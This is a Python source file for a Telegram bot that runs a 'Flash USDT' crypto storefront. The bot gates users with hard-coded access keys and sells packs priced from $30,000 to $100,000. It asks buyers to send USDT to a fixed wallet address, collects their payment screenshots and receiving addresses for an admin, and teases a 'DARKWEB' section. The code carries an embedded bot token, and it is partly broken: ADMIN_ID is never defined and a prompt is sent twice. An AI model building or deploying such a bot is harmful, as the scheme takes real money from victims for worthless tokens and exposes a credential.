import telebot
import os
import json
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# =========================
# BOT TOKEN
# =========================
TOKEN = "8823653086:AAFFecnpQ-tTiOQTlrRizihBy7HzfB-LYT8"

bot = telebot.TeleBot(TOKEN)

# =========================
# ADMIN ID
# =========================

# =========================
# LOAD USED KEYS
# =========================
try:
    with open("used_keys.json", "r") as f:
        used_keys = json.load(f)
except:
    used_keys = []

# =========================
# VALID KEYS
# =========================
valid_keys = [
    "GTA7821", "VICE4509", "SAN9922", "CJ2901",
    "GROVE6644", "BALLAS7710", "JETPACK22",
    "RHINO6619", "GODMODE55", "NITRO1109",
    "FASTRUN88", "TREVER611", "MICHAEL18",
    "FRANK5502", "GTAONLINE", "DRIFT8890",
    "STEALTH66", "HEADSHOT2", "CHEAT555",
    "BOOST3310", "TURBO8821", "ROCKSTAR1",
    "MISSION50", "LEVEL6631", "SERVER882",
    "VALID7700", "PREMIUM44", "EPIC1199",
    "ULTRA7714", "FIVEM6615", "ROLE8828",
    "ELITE9920", "ACCESS110", "KEY7731",
    "BETA4419", "PRO5523", "TOP6627",
    "XP8818", "CASH2205", "MOD7715",
    "DEV4413", "FINAL9999", "LOS7788",
    "GTAX9900", "CHEAT8112", "RACE6618",
    "LOW7712", "OPEN1189", "MOD5528",
    "CAR4411", "INFER2290", "BANS7717",
    "BUFF5509", "SULT6622", "COMET8891",
    "ADDER7710", "ZEN1112", "KUR7729",
    "AKUMA4402", "JET8812", "DROP1180",
    "ADMIN1101", "MASTER773", "LUX9928",
    "MEGA8826", "FREE4400", "RAMP3301",
    "SKY2200", "ARMOR9988", "AMMO6633",
    "FLY6610", "CHASE1181", "MONEY6401",
    "NOCOPS91", "SUPER5578", "DRIVE1299",
    "BOOST7719", "MISSION66", "NIGHT9911",
    "WORLD2209", "GTARP8802", "VCS2201",
    "LIB9931", "CHEAT1182", "SPEED8811",
    "KEY2208", "MAX1091", "RUN5505",
    "PLAY7711", "HACK5520", "RIDER9091",
    "CODE7710", "GAMER882", "POWER663",
    "ULTRA999", "VIP2026", "ACCESS777"
]

# =========================
# START COMMAND
# =========================
@bot.message_handler(commands=['start'])
def start(message):

    text = """
👋 Welcome to FLASH USDT STORE

⚡ Access premium crypto tools, tutorials, and exclusive services securely in one place.

🔑 Please enter your access key:
"""

    bot.send_message(message.chat.id, text)

# =========================
# KEY VERIFICATION
# =========================
@bot.message_handler(func=lambda message: True, content_types=['text'])
def verify_key(message):

    user_key = message.text.strip()

    if user_key in valid_keys and user_key not in used_keys:

        used_keys.append(user_key)

        # SAVE USED KEYS
        with open("used_keys.json", "w") as f:
            json.dump(used_keys, f)

        markup = InlineKeyboardMarkup()

        btn1 = InlineKeyboardButton(
            "FLASH USDT PURCHASE",
            callback_data="purchase"
        )

        btn2 = InlineKeyboardButton(
            "Crypto Wallet Guide",
            callback_data="wallet"
        )

        btn3 = InlineKeyboardButton(
            "Trading Tutorials",
            callback_data="trade"
        )

        btn4 = InlineKeyboardButton(
            "DARKWEB",
            callback_data="darkweb"
        )

        markup.add(btn1)
        markup.add(btn2)
        markup.add(btn3)
        markup.add(btn4)

        bot.send_message(
            message.chat.id,
            "✅ Access Granted",
            reply_markup=markup
        )

    else:

        bot.send_message(
            message.chat.id,
            "❌ Invalid or Already Used Key"
        )

# =========================
# BUTTON CALLBACKS
# =========================
@bot.callback_query_handler(func=lambda call: True)
def callback(call):

    # =========================
    # PURCHASE MENU
    # =========================
    if call.data == "purchase":

        markup = InlineKeyboardMarkup()

        btn1 = InlineKeyboardButton(
            "Starter Pack $30,000",
            callback_data="pack30"
        )

        btn2 = InlineKeyboardButton(
            "Pro Pack $70,000",
            callback_data="pack70"
        )

        btn3 = InlineKeyboardButton(
            "Premium Pack $100,000",
            callback_data="pack100"
        )

        markup.add(btn1)
        markup.add(btn2)
        markup.add(btn3)

        bot.send_message(
            call.message.chat.id,
            "💸 Select Your Package",
            reply_markup=markup
        )

    # =========================
    # PAYMENT GATEWAY
    # =========================
    elif call.data in ["pack30", "pack70", "pack100"]:

        bot.send_message(
            call.message.chat.id,
            """
💳 PAYMENT GATEWAY

📌 Payment Details

USDT BEP20:

0x712707705ec8dcb98c2220e06fd744ba8984991e

✅ Send USDT to this address
✅ Upload payment screenshot for verification
"""
        )

    # =========================
    # WALLET GUIDE
    # =========================
    elif call.data == "wallet":

        bot.send_message(
            call.message.chat.id,
            """
📚 CRYPTO WALLET GUIDE

1. Download Trust Wallet
2. Create Wallet
3. Save Recovery Phrase
4. Add USDT BEP20
5. Start Using Wallet
"""
        )

    # =========================
    # TRADING TUTORIALS
    # =========================
    elif call.data == "trade":

        bot.send_message(
            call.message.chat.id,
            """
📈 TRADING TUTORIALS

• Spot Trading
• Futures Basics
• Risk Management
• Technical Analysis
"""
        )

    # =========================
    # DARKWEB
    # =========================
    elif call.data == "darkweb":

        bot.send_message(
            call.message.chat.id,
            "🌐 Darkweb section coming soon"
        )

## =========================
# SCREENSHOT UPLOAD
# =========================
@bot.message_handler(content_types=['photo'])
def handle_photo(message):

    try:
        # Get highest quality image
        photo = message.photo[-1]

        # Get file info from Telegram
        file_info = bot.get_file(photo.file_id)

        # Download file
        downloaded_file = bot.download_file(file_info.file_path)

        # Create screenshots folder if not exists
        if not os.path.exists("screenshots"):
            os.makedirs("screenshots")

        # Save image locally
        file_path = f"screenshots/{message.from_user.id}.jpg"

        with open(file_path, "wb") as new_file:
            new_file.write(downloaded_file)

        # Ask for wallet
        msg = bot.send_message(
            message.chat.id,
            """
✅ Payment screenshot saved successfully.

📥 Please enter your RECEIVER ERC20 USDT address:
"""
        )

        bot.register_next_step_handler(msg, save_wallet)

    except Exception as e:
        bot.send_message(
            message.chat.id,
            f"❌ Error saving screenshot:\n{e}"
        )
    

    # Ask for ERC20 wallet
    msg = bot.send_message(
        message.chat.id,
        """
✅ Payment screenshot received.

📥 Please enter your RECEIVER ERC20 USDT address:
"""
    )

    bot.register_next_step_handler(msg, save_wallet)

# =========================
# SAVE ERC20 ADDRESS
# =========================
def save_wallet(message):

    wallet = message.text

    username = message.from_user.username or "NoUsername"

    # Send wallet to admin
    bot.send_message(
        ADMIN_ID,
        f"""
💰 USER ERC20 ADDRESS

👤 User: @{username}
🆔 ID: {message.from_user.id}

🏦 Wallet:
{wallet}
"""
    )

    # Confirmation to user
    bot.send_message(
        message.chat.id,
        """
YOUR ORDER HAS BEEN PLACED SUCCESSFULLY

⏳ Processing Time: 1 - 4 Hours

🙏 Thanks for visiting
"""
    )

# =========================
# RUN BOT
# =========================
print("Bot Running...")

bot.remove_webhook()
bot.infinity_polling()